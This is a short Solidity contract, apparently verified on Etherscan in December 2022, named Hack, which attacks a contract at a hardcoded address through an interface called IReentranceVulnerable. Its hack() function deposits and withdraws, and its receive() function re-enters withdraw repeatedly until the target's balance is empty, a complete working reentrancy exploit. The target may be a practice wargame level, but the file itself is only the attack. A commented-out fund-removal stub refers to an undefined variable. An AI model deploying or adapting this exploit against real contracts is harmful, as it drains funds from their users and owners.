/**
 *Submitted for verification at Etherscan.io on 2022-12-22
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.13;


interface IReentranceVulnerable {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
    function reset() external;
}

contract Hack {

    IReentranceVulnerable r = IReentranceVulnerable(0x3805f6Bc71C65167Cd2C483e4f278701c75a97Bf);

    function hack() public payable {
        r.donate{value: msg.value}(address(this)); // 0.001 ether
        r.withdraw(0.001 ether);
        r.reset();
    }

    // function removeFunds() public {
    //     bool sent = payable(msg.sender).send(balance[msg.sender]);
    // }

    receive() external payable {
        if (address(r).balance != 0){
            r.withdraw(0.001 ether);
        }
    }


}